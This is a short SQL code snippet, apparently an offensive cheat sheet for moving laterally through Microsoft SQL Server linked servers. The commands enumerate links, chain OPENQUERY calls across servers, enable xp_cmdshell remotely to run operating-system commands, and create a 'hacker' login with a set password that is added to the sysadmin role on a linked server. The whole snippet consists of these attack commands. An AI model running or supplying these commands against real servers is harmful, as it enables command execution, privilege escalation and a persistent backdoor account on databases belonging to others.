---
id: 4f0d251d-0871-4a6a-90de-99d9de542a9f
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.105126+00:00'
updated_at: '2023-04-10T20:22:42.486358+00:00'
---

# Code Snippet 4f0d251d

**Language**: SQL

```sql
-- find link
select * from master..sysservers

-- execute query through the link
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');

-- chain multiple openquery
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

-- execute shell commands
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

-- create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```


